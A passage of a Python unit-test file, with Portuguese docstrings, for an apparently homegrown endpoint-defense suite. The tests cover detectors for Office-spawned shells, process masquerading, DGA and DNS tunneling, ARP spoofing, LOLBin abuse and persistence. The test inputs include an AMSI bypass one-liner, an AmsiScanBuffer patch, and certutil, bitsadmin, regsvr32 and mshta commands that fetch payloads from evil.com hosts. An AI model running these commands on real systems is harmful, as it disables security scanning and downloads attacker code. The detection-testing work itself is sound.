    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_office_child_process_blocking(self):
        """Valida que processos de escritório (Word/Excel/Acrobat) gerando interpretadores são bloqueados."""
        # 1. Word gerando PowerShell (Macro maliciosa / Exploit)
        res_word = self.guard.evaluate_synthetic_execution("winword.exe", "powershell.exe")
        self.assertTrue(res_word["is_exploit"])
        self.assertEqual(res_word["rule"], "OFFICE_SPAWNED_SHELL_EXPLOIT")
        self.assertEqual(res_word["severity"], "CRITICAL")

        # 2. Excel gerando CMD
        res_excel = self.guard.evaluate_synthetic_execution("excel.exe", "cmd.exe")
        self.assertTrue(res_excel["is_exploit"])

        # 3. Acrobat gerando mshta
        res_pdf = self.guard.evaluate_synthetic_execution("acrord32.exe", "mshta.exe")
        self.assertTrue(res_pdf["is_exploit"])

        # 4. Execução benigna (Explorer gerando notepad)
        res_benign = self.guard.evaluate_synthetic_execution("explorer.exe", "notepad.exe")
        self.assertFalse(res_benign["is_exploit"])

    def test_02_process_hollowing_masquerading(self):
        """Valida detecção de processos críticos executando fora do System32 (Masquerading / Hollowing)."""
        # 1. svchost falso rodando na pasta pública de usuários
        res_fake_svchost = self.guard.evaluate_synthetic_execution(
            parent_name="cmd.exe",
            child_name="svchost.exe",
            child_exe="C:\\Users\\Public\\svchost.exe"
        )
        self.assertTrue(res_fake_svchost["is_exploit"])
        self.assertEqual(res_fake_svchost["rule"], "PROCESS_HOLLOWING_MASQUERADING")

        # 2. svchost legítimo no System32
        res_valid_svchost = self.guard.evaluate_synthetic_execution(
            parent_name="services.exe",
            child_name="svchost.exe",
            child_exe="C:\\Windows\\System32\\svchost.exe"
        )
        self.assertFalse(res_valid_svchost["is_exploit"])

    def test_03_amsi_etw_tampering(self):
        """Valida bloqueio de scripts PowerShell tentando cegar o AMSI ou ETW."""
        cmd_amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        res_amsi = self.guard.evaluate_synthetic_execution("powershell.exe", "powershell.exe", child_cmdline=cmd_amsi)
        self.assertTrue(res_amsi["is_exploit"])
        self.assertEqual(res_amsi["rule"], "AMSI_BYPASS_REFLECTION")

        cmd_scanbuffer = "function Patch-Amsi { [Byte[]]$Patch = 0xc3; VirtualProtect(AmsiScanBuffer) }"
        res_patch = self.guard.evaluate_synthetic_execution("powershell.exe", "powershell.exe", child_cmdline=cmd_scanbuffer)
        self.assertTrue(res_patch["is_exploit"])
        self.assertEqual(res_patch["rule"], "AMSI_SCANBUFFER_PATCH")

    def test_04_status_and_shields(self):
        """Valida estrutura de status e escudos do motor anti-exploit."""
        status = self.guard.get_status()
        self.assertEqual(status["status"], "HARDENED_ACTIVE")
        self.assertTrue(status["active_shields"]["office_pdf_shield"])
        self.assertTrue(status["active_shields"]["anti_hollowing"])
        self.assertGreater(len(status["vulnerable_parent_apps_protected"]), 5)

    def test_05_anti_exploit_api_endpoints(self):
        """Valida endpoints REST de Anti-Exploit."""
        # 1. Status
        res_status = self.client.get("/api/anti-exploit/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "HARDENED_ACTIVE")

        # 2. Simular Exploit
        res_sim = self.client.post("/api/anti-exploit/simulate-exploit", json={"parent": "winword.exe", "child": "powershell.exe"})
        self.assertEqual(res_sim.status_code, 200)
        self.assertTrue(res_sim.get_json().get("is_exploit"))

        # 3. Varredura no SO
        res_scan = self.client.post("/api/anti-exploit/scan")
        self.assertEqual(res_scan.status_code, 200)
        self.assertEqual(res_scan.get_json().get("status"), "success")

        # 4. Histórico de Eventos
        res_events = self.client.get("/api/anti-exploit/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")


class TestNetworkPerimeterGuard(unittest.TestCase):
    """Suite de testes para o motor de Rede e Perímetro Local (DGA, ARP Spoofing & DNS Tunneling)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = NetworkPerimeterGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_dga_detection(self):
        """Valida que domínios com alta entropia estocástica de Shannon são identificados como DGA de C2."""
        # 1. Domínio DGA sintético (botnet / ransomware C2)
        dga_domain = "ax7b9kql0mzpqr.biz"
        res_dga = self.guard.inspect_dns_query(dga_domain)
        self.assertEqual(res_dga["status"], "DGA_C2_DETECTED")
        self.assertEqual(res_dga["mitre"], "T1568.002")
        self.assertGreaterEqual(res_dga["entropy"], 3.5)

        # 2. Domínio legítimo comum (Google)
        legit_domain = "google.com"
        res_legit = self.guard.inspect_dns_query(legit_domain)
        self.assertEqual(res_legit["status"], "CLEAN")
        self.assertEqual(res_legit["classification"], "LEGITIMATE")

    def test_02_dns_tunneling_detection(self):
        """Valida que consultas DNS com payloads embutidos são identificadas como DNS Tunneling."""
        # Payload com subdomínio longo de exfiltração
        tunnel_domain = "c3NoLWV4ZmlsdHJhdGlvbi1kYXRhLXBheWxvYWQxMjM0NTY3ODk.evil.com"
        res_tunnel = self.guard.inspect_dns_query(tunnel_domain)
        self.assertEqual(res_tunnel["status"], "DNS_TUNNELING_DETECTED")
        self.assertEqual(res_tunnel["mitre"], "T1071.004")
        self.assertEqual(res_tunnel["severity"], "CRITICAL")

    def test_03_arp_spoofing_mitm_detection(self):
        """Valida detecção de duplicatas de endereço MAC (ataque Man-in-the-Middle via ARP Poisoning)."""
        # Saída ARP simulada contendo envenenamento (o Gateway 192.168.1.1 e o IP do atacante 192.168.1.50 têm o mesmo MAC)
        poisoned_arp_output = """
        Interface: 192.168.1.100 --- 0x3
          Endereço IP           Endereço Físico       Tipo
          192.168.1.1           00-11-22-33-44-55     dinâmico
          192.168.1.50          00-11-22-33-44-55     dinâmico
          192.168.1.20          aa-bb-cc-dd-ee-ff     dinâmico
        """
        report_attack = self.guard.audit_arp_table(custom_arp_output=poisoned_arp_output)
        self.assertEqual(report_attack["status"], "MITM_ATTACK_DETECTED")
        self.assertGreaterEqual(report_attack["alerts_count"], 1)
        alert = report_attack["alerts"][0]
        self.assertEqual(alert["mac"], "00:11:22:33:44:55")
        self.assertIn("192.168.1.1", alert["conflicting_ips"])
        self.assertIn("192.168.1.50", alert["conflicting_ips"])

        # Saída ARP saudável (sem duplicatas)
        clean_arp_output = """
        Interface: 192.168.1.100 --- 0x3
          Endereço IP           Endereço Físico       Tipo
          192.168.1.1           00-11-22-33-44-55     dinâmico
          192.168.1.20          aa-bb-cc-dd-ee-ff     dinâmico
        """
        report_clean = self.guard.audit_arp_table(custom_arp_output=clean_arp_output)
        self.assertEqual(report_clean["status"], "HEALTHY")
        self.assertEqual(report_clean["alerts_count"], 0)

    def test_04_hosts_file_and_listeners(self):
        """Valida auditoria do arquivo hosts e portas de escuta."""
        hosts_audit = self.guard.audit_hosts_file()
        self.assertIn(hosts_audit.get("status"), ["INTEACT", "HOSTS_FILE_HIJACKED", "NOT_FOUND"])

        listeners = self.guard.audit_network_listeners()
        self.assertIsInstance(listeners, list)

    def test_05_perimeter_api_endpoints(self):
        """Valida endpoints REST do Perimeter Guard."""
        # 1. Status
        res_status = self.client.get("/api/perimeter-guard/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "ACTIVE_DEFENSE")
        self.assertTrue(data.get("active_shields", {}).get("dga_armor"))

        # 2. Inspecionar DNS
        res_dns = self.client.post("/api/perimeter-guard/inspect-dns", json={"domain": "google.com"})
        self.assertEqual(res_dns.status_code, 200)
        self.assertEqual(res_dns.get_json().get("status"), "CLEAN")

        # 3. Auditar ARP
        res_arp = self.client.post("/api/perimeter-guard/audit-arp", json={})
        self.assertEqual(res_arp.status_code, 200)

        # 4. Eventos
        res_events = self.client.get("/api/perimeter-guard/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")


class TestPosturePersistenceGuard(unittest.TestCase):
    """Suite de testes para o motor de Postura, Persistência e LOLBins."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, "test_events.db")
        self.key_path = os.path.join(self.temp_dir, "test.key")
        self.quarantine_dir = os.path.join(self.temp_dir, "quarantine")

        self.logger = SecurityEventLogger(self.db_path)
        self.vault = CryptoVault(self.key_path)
        self.soar = AutoResponseEngine(self.logger, self.vault, self.quarantine_dir)
        self.guard = PosturePersistenceGuard(logger=self.logger, soar=self.soar)
        self.client = app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_lolbin_abuse_detection(self):
        """Valida detecção de abuso de binários legítimos do sistema operacional (LOLBins)."""
        # 1. Certutil com download furtivo (-urlcache -split)
        res_certutil = self.guard.evaluate_lolbin_command(
            "certutil.exe", "certutil.exe -urlcache -split -f http://evil-payload.com/trojan.exe payload.exe"
        )
        self.assertTrue(res_certutil["is_lolbin_abuse"])
        self.assertEqual(res_certutil["rule"], "LOLBIN_CERTUTIL_DOWNLOAD")
        self.assertEqual(res_certutil["mitre"], "T1105")

        # 2. BITSAdmin download
        res_bits = self.guard.evaluate_lolbin_command(
            "bitsadmin.exe", "bitsadmin /transfer job1 /download /priority high http://evil.com/x.dll C:\\x.dll"
        )
        self.assertTrue(res_bits["is_lolbin_abuse"])

        # 3. Regsvr32 Squiblydoo
        res_reg = self.guard.evaluate_lolbin_command(
            "regsvr32.exe", "regsvr32 /s /u /i:http://evil.com/script.sct scrobj.dll"
        )
        self.assertTrue(res_reg["is_lolbin_abuse"])
        self.assertEqual(res_reg["rule"], "LOLBIN_REGSVR32_SQUIBLYDOO")

        # 4. Mshta script remoto
        res_mshta = self.guard.evaluate_lolbin_command(
            "mshta.exe", "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:http://evil.com/a.sct\"\")\"))"
        )
        self.assertTrue(res_mshta["is_lolbin_abuse"])

        # 5. Comando benigno (Certutil calculando hash)
        res_benign = self.guard.evaluate_lolbin_command(
            "certutil.exe", "certutil.exe -hashfile C:\\Windows\\notepad.exe SHA256"
        )
        self.assertFalse(res_benign["is_lolbin_abuse"])

    def test_02_synthetic_persistence_evaluation(self):
        """Valida detecção de persistências em pastas proibidas ou via técnicas maliciosas."""
        # 1. Executável em AppData Temp configurado na chave Run
        res_temp = self.guard.evaluate_synthetic_persistence(
            "SecurityUpdate",
            "C:\\Users\\User\\AppData\\Local\\Temp\\updater.exe",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        )
        self.assertTrue(res_temp["is_suspicious"])
        self.assertIn("appdata\\local\\temp", res_temp["reasons"][0].lower())

        # 2. Persistência executando VBS ou script oculto
        res_script = self.guard.evaluate_synthetic_persistence(
            "PayloadVBS",
            "wscript.exe C:\\Users\\Public\\malware.vbs",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        )
        self.assertTrue(res_script["is_suspicious"])

        # 3. IFEO Debugger Hijack
        res_ifeo = self.guard.evaluate_synthetic_persistence(
            "Debugger",
            "C:\\evil.exe",
            "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
        )
        self.assertTrue(res_ifeo["is_suspicious"])

        # 4. Entrada benigna em Program Files
        res_clean = self.guard.evaluate_synthetic_persistence(
            "MicrosoftEdge",
            "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window",
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        )
        self.assertFalse(res_clean["is_suspicious"])

    def test_03_asep_and_hardening_auditor(self):
        """Valida execução da varredura de ASEP e auditoria de postura CIS."""
        asep_report = self.guard.scan_asep_registry_and_files()
        self.assertIn(asep_report["status"], ["CLEAN", "THREATS_DETECTED"])
        self.assertIsInstance(asep_report["entries_analyzed"], int)

        hardening = self.guard.audit_system_hardening()
        self.assertGreaterEqual(hardening["posture_score"], 0)
        self.assertLessEqual(hardening["posture_score"], 100)
        self.assertIn(hardening["posture_rating"], ["EXCELLENT", "MODERATE", "CRITICAL"])
        self.assertGreaterEqual(len(hardening["checks"]), 3)

    def test_04_status_and_shields(self):
        """Valida integridade do status e escudos do motor de postura."""
        status = self.guard.get_status()
        self.assertEqual(status["status"], "HARDENED_ACTIVE")
        self.assertTrue(status["active_shields"]["asep_hunter"])
        self.assertTrue(status["active_shields"]["lolbin_monitor"])

    def test_05_posture_api_endpoints(self):
        """Valida endpoints REST de Postura e Persistência."""
        # 1. Status
        res_status = self.client.get("/api/posture-guard/status")
        self.assertEqual(res_status.status_code, 200)
        data = res_status.get_json()
        self.assertEqual(data.get("status"), "HARDENED_ACTIVE")
        self.assertIn("posture_score", data)

        # 2. Inspecionar LOLBin
        res_lolbin = self.client.post("/api/posture-guard/inspect-lolbin", json={
            "process_name": "certutil.exe",
            "cmdline": "certutil -urlcache -split -f http://evil.com/payload.exe"
        })
        self.assertEqual(res_lolbin.status_code, 200)
        self.assertTrue(res_lolbin.get_json().get("is_lolbin_abuse"))

        # 3. Varredura ASEP
        res_asep = self.client.post("/api/posture-guard/scan-asep")
        self.assertEqual(res_asep.status_code, 200)

        # 4. Auditoria de Hardening
        res_hard = self.client.post("/api/posture-guard/audit-posture")
        self.assertEqual(res_hard.status_code, 200)

        # 5. Eventos
        res_events = self.client.get("/api/posture-guard/events")
        self.assertEqual(res_events.status_code, 200)
        self.assertEqual(res_events.get_json().get("status"), "success")

    def test_06_protection_diagnostics_endpoint(self):
        """Valida que o endpoint de diagnóstico retorna com sucesso todas as 20 camadas soberanas."""
        res = self.client.get("/api/protection/diagnostics")
        self.assertEqual(res.status_code, 200)
        data = res.get_json()
        self.assertEqual(data.get("status"), "success")
        self.assertEqual(data.get("total_layers"), 20)
        self.assertEqual(data.get("active_layers"), 20)
        self.assertEqual(data.get("overall_health"), 100)
        subsystems = data.get("subsystems", [])
        self.assertEqual(len(subsystems), 20)
        for sub in subsystems:
            self.assertEqual(sub.get("status"), "OPERACIONAL")
            self.assertEqual(sub.get("health"), 100)

    def test_07_functions_alarms_and_telemetry_endpoints(self):
        """Valida os novos endpoints do Functions Engine: alarmes, presets e coleta de telemetria."""
        # 1. Presets
        res_presets = self.client.get("/api/functions/presets")
        self.assertEqual(res_presets.status_code, 200)
        self.assertGreaterEqual(res_presets.get_json().get("count", 0), 3)

        # 2. Coleta de telemetria
        res_collect = self.client.post("/api/functions/collect")
        self.assertEqual(res_collect.status_code, 200)
        self.assertEqual(res_collect.get_json().get("status"), "success")

        # 3. Cadastro de regra de alarme
        res_reg = self.client.post("/api/functions/alarms/register", json={
            "name": "Alarme Teste API",
            "expression": 'last("sentinel.active_layers.count") >= 20',
            "severity": "INFO",
            "description": "Teste automatizado de integridade"
        })
        self.assertEqual(res_reg.status_code, 200)
        rule_id = res_reg.get_json().get("rule", {}).get("id")
        self.assertIsNotNone(rule_id)

        # 4. Consulta de alarmes
        res_alarms = self.client.get("/api/functions/alarms")
        self.assertEqual(res_alarms.status_code, 200)
        self.assertEqual(res_alarms.get_json().get("status"), "success")
        self.assertIn("rules", res_alarms.get_json())

        # 5. Remoção de regra de alarme
        res_del = self.client.post("/api/functions/alarms/delete", json={"rule_id": rule_id})
        self.assertEqual(res_del.status_code, 200)
        self.assertEqual(res_del.get_json().get("status"), "success")

        # 6. Sumário de telemetria estruturado para gráficos
        res_summary = self.client.get("/api/functions/telemetry/summary")
        self.assertEqual(res_summary.status_code, 200)
        sum_json = res_summary.get_json()
        self.assertEqual(sum_json.get("status"), "success")
        self.assertIn("metrics", sum_json)
        self.assertGreater(sum_json.get("total_metrics", 0), 0)

    def test_08_wal_retention_and_vacuum_endpoints(self):
        """Valida modos WAL, retenção e compactação VACUUM do banco de dados SQLite."""
        # 1. Testar endpoint de vacuum
        res_vac = self.client.post("/api/logs/vacuum")
        self.assertEqual(res_vac.status_code, 200)
        self.assertEqual(res_vac.get_json().get("status"), "success")

        # 2. Testar endpoint de purge
        res_purge = self.client.post("/api/logs/purge", json={"days": 30, "max_records": 10000})
        self.assertEqual(res_purge.status_code, 200)
        self.assertEqual(res_purge.get_json().get("status"), "success")
        self.assertIn("purged_events", res_purge.get_json())

    def test_09_defense_mode_and_forensic_report_endpoints(self):
        """Valida os modos de defesa (STANDARD, ELEVATED, LOCKDOWN) e exportação de relatório forense."""
        # 1. Consulta inicial do modo
        res_mode = self.client.get("/api/defense/mode")
        self.assertEqual(res_mode.status_code, 200)
        self.assertEqual(res_mode.get_json().get("status"), "success")

        # 2. Alteração para ELEVATED
        res_elevated = self.client.post("/api/defense/mode", json={"mode": "ELEVATED"})
        self.assertEqual(res_elevated.status_code, 200)
        self.assertEqual(res_elevated.get_json().get("mode"), "ELEVATED")

        # 3. Alteração para STANDARD
        res_std = self.client.post("/api/defense/mode", json={"mode": "STANDARD"})
        self.assertEqual(res_std.status_code, 200)
        self.assertEqual(res_std.get_json().get("mode"), "STANDARD")

        # 4. Consulta de Relatório Forense Executivo (JSON)
        res_rep = self.client.get("/api/reports/forensic")
        self.assertEqual(res_rep.status_code, 200)
        rep_json = res_rep.get_json()
        self.assertIn("title", rep_json)
        self.assertIn("security_posture", rep_json)
        self.assertIn("integrity_sha256", rep_json)
        self.assertEqual(len(rep_json.get("integrity_sha256")), 64)

        # 5. Consulta de Relatório Forense Executivo Pronto para PDF (HTML A4)
        res_html = self.client.get("/api/reports/forensic/html")
        self.assertEqual(res_html.status_code, 200)
        self.assertIn(b"SENTINEL XDR", res_html.data)
        self.assertIn(b"window.print()", res_html.data)

    def test_10_thread_watchdog_auto_healing(self):
        """Valida a capacidade de auto-cura (self-healing) do SentinelThreadWatchdog."""
        from sentinela_service import SentinelThreadWatchdog
        import time

        watchdog = SentinelThreadWatchdog(check_interval=0.1)
        run_counter = [0]

        def flaky_worker():
            run_counter[0] += 1
            # Termina intencionalmente para acionar o watchdog
            return

        watchdog.register_thread("TestFlakyWorker", flaky_worker, daemon=True)
        watchdog.start()

        # Aguarda 2 ciclos de supervisão do watchdog
        time.sleep(0.35)
        watchdog.stop()

        self.assertGreaterEqual(watchdog.healed_count, 1)
    def test_11_sse_streaming_and_quarantine_inspect(self):
        """Valida o streaming SSE em tempo real e a inspeção forense de quarentena (Entropia & Strings)."""
        import os
        from sentinel_api import sse_broadcaster, calculate_shannon_entropy

        # 1. Valida cálculo matemático de entropia de Shannon
        low_ent = calculate_shannon_entropy(b"AAAAAAAABBBBBBBBCCCCCCCC")
        high_ent = calculate_shannon_entropy(os.urandom(1000))
        self.assertLess(low_ent, 2.0)
        self.assertGreater(high_ent, 7.0)

        # 2. Valida conexão e heartbeat SSE
        res_sse = self.client.get("/api/stream/events")
        self.assertEqual(res_sse.status_code, 200)
        self.assertEqual(res_sse.mimetype, "text/event-stream")

        # 3. Valida inspeção de quarentena com artefato contendo IOCs e comandos
        target_soar = getattr(self, "soar", None)
        quarantine_dir = getattr(target_soar, "quarantine_dir", os.path.join(self.temp_dir, "quarantine"))
        os.makedirs(quarantine_dir, exist_ok=True)
        sample_path = os.path.join(quarantine_dir, "test_threat.quarantine")
        with open(sample_path, "wb") as f:
            f.write(b"powershell.exe -w hidden -enc JABhID0... VirtualAlloc http://185.220.101.5/c2" + os.urandom(400))

        try:
            res_insp = self.client.get(f"/api/quarantine/inspect?file={sample_path}")
            self.assertEqual(res_insp.status_code, 200)
            data = res_insp.get_json()
            self.assertEqual(data.get("status"), "SUCCESS")
            self.assertIn("hashes", data)
            self.assertIn("entropy", data)
            self.assertIn("suspicious_indicators", data)
            self.assertGreater(data["entropy"]["global_shannon"], 5.0)
            self.assertIn("COMMANDS", data["suspicious_indicators"])
        finally:
            if os.path.exists(sample_path):
                os.remove(sample_path)


class TestMultiAgentLayer(unittest.TestCase):
    """Valida a camada Multi-Host XDR (hub central + agentes federados)."""

    def setUp(self):
        from flask import Flask
        from multiagent import MultiAgentConfig, MultiAgentServer
        self.temp_dir = tempfile.mkdtemp()
        self.config = MultiAgentConfig(
            role="hub",
            agent_id="hub-test",
            state_dir=os.path.join(self.temp_dir, "state"),
            offline_timeout=20.0,
            mass_offline_threshold=2,
            incident_window=60.0,
        )
        self.flask_app = Flask(__name__)
        self.server = MultiAgentServer(self.config)
        self.server.init_app(self.flask_app)
        self.client = self.flask_app.test_client()

    def tearDown(self):
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_01_bus_local_queue(self):
        """Valida a fila thread-safe do barramento local do agente."""
        from multiagent import MultiAgentEventBus
        bus = MultiAgentEventBus(max_pending=5, flush_size=2)
        for i in range(7):
            bus.push("HIGH", "TEST", f"target-{i}", f"evento {i}")
        self.assertEqual(bus.pending, 5)  # max_pending respeitado (descarta o mais antigo)
        batch = bus.drain()
        self.assertEqual(len(batch), 2)   # flush_size default
        rest = bus.drain(100)
        self.assertEqual(len(rest), 3)

    def test_02_heartbeat_and_telemetry_endpoints(self):
        """Valida registro de heartbeat, telemetria e agregação no status do hub."""
        hb = self.client.post("/api/multiagent/heartbeat", json={
            "agent_id": "node-alpha", "hostname": "ALPHA-PC", "ip": "10.0.0.2",
            "platform": "Windows 11", "version": "2.1.0-MULTIHOST", "layers_active": 20,
        })
        self.assertEqual(hb.status_code, 200)
        self.assertEqual(hb.get_json()["status"], "success")

        tel = self.client.post("/api/multiagent/telemetry", json={
            "agent_id": "node-alpha", "metrics": {"cpu_util": 42.5, "memory_util": 61.0},
        })
        self.assertEqual(tel.status_code, 200)

        data = self.client.get("/api/multiagent/status").get_json()
        self.assertEqual(data["hosts_count"], 1)
        self.assertEqual(data["online_count"], 1)
        self.assertEqual(data["events_count"], 0)

        hosts = self.client.get("/api/multiagent/hosts").get_json()["hosts"]
        self.assertEqual(hosts[0]["agent_id"], "node-alpha")
        self.assertEqual(hosts[0]["metrics"]["cpu_util"], 42.5)
        self.assertTrue(hosts[0]["online"])

    def test_03_events_and_shared_ioc_correlation(self):
        """Dois hosts reportando o mesmo IOC público -> alerta de movimentação lateral."""
        import time
        for aid in ("node-alpha", "node-beta"):
            self.client.post("/api/multiagent/heartbeat", json={"agent_id": aid, "hostname": aid.upper()})
            self.client.post("/api/multiagent/events", json={
                "agent_id": aid,
                "events": [{
                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "severity": "CRITICAL", "category": "C2",
                    "target": "cmd.exe", "description": "Beacon para 185.220.101.5",
                }],
            })
        corr = self.client.get("/api/multiagent/correlations").get_json()["correlations"]
        self.assertIn("SHARED_IOC_MULTIHOST", {c["rule"] for c in corr})
        events = self.client.get("/api/multiagent/events/list?limit=50").get_json()["events"]
        self.assertEqual(len(events), 2)

    def test_04_mass_offline_correlation(self):
        """Hosts conhecidos que param de enviar heartbeat -> alerta de interrupção em massa."""
        for aid in ("ghost-1", "ghost-2"):
            self.client.post("/api/multiagent/heartbeat", json={"agent_id": aid})
        # Simula que ambos pararam de responder (heartbeat no passado)
        for rec in self.server.registry._hosts.values():
            rec.last_heartbeat -= (self.config.offline_timeout + 5)
        alerts = self.server.registry.evaluate_correlations(
            window=self.config.incident_window,
            mass_offline_threshold=self.config.mass_offline_threshold,
        )
        self.assertTrue(any(a["rule"] == "MASS_OFFLINE" for a in alerts))

    def test_05_token_auth(self):
        """Valida autenticação por token compartilhado entre hub e agentes."""
        self.config.token = "s3cr3t-token"
        res_no = self.client.post("/api/multiagent/heartbeat", json={"agent_id": "x"})
        self.assertEqual(res_no.status_code, 401)
        res_ok = self.client.post(
            "/api/multiagent/heartbeat",
            json={"agent_id": "x"},
            headers={"X-Sentinel-Token": "s3cr3t-token"},
        )
        self.assertEqual(res_ok.status_code, 200)

    def test_06_state_persistence_roundtrip(self):
        """Valida persistência e restauração do estado do hub (hosts + eventos)."""
        self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-alpha", "hostname": "ALPHA"})
        self.client.post("/api/multiagent/events", json={
            "agent_id": "node-alpha",
            "events": [{"severity": "HIGH", "category": "TEST", "target": "t", "description": "d"}],
        })
        from multiagent import AgentRegistry
        reg2 = AgentRegistry(state_dir=self.config.state_dir)
        loaded = reg2.load_state()
        self.assertEqual(loaded, 1)
        rec = reg2.get("node-alpha")
        self.assertIsNotNone(rec)
        self.assertEqual(rec.events_count, 1)
        self.assertEqual(len(rec.events), 1)

    def test_07_remove_host_and_status_summary(self):
        """Valida remoção administrativa de host e o resumo consolidado do hub."""
        self.client.post("/api/multiagent/heartbeat", json={"agent_id": "node-alpha"})
        res = self.client.post("/api/multiagent/hosts/node-alpha/remove")
        self.assertEqual(res.get_json()["removed"], True)
        res2 = self.client.post("/api/multiagent/hosts/node-alpha/remove")
        self.assertEqual(res2.get_json()["status"], "not_found")
        summary = self.server.status_summary()
        self.assertEqual(summary["status"], "success")
        self.assertEqual(summary["hosts_count"], 0)

    def test_08_client_payload_and_lifecycle(self):
        """Valida construção do heartbeat e ciclo de vida do cliente multi-host."""
        from multiagent import MultiAgentClient, MultiAgentConfig
        cfg = MultiAgentConfig(
            role="agent", agent_id="unit-node",
            hub_url="http://127.0.0.1:1", heartbeat_interval=0.05,
        )
        cli = MultiAgentClient(cfg)
        hb = cli._build_heartbeat()
        self.assertEqual(hb["agent_id"], "unit-node")
        self.assertIn("ip", hb)
        self.assertIn("platform", hb)
        self.assertFalse(cli.running)
        cli.start()
        try:
            self.assertTrue(cli.running)
            cli.push_local_event("HIGH", "TEST", "t", "d")
            self.assertGreaterEqual(cli.bus.pending, 1)
        finally:
            cli.stop()
        self.assertFalse(cli.running)


if __name__ == "__main__":
    unittest.main()
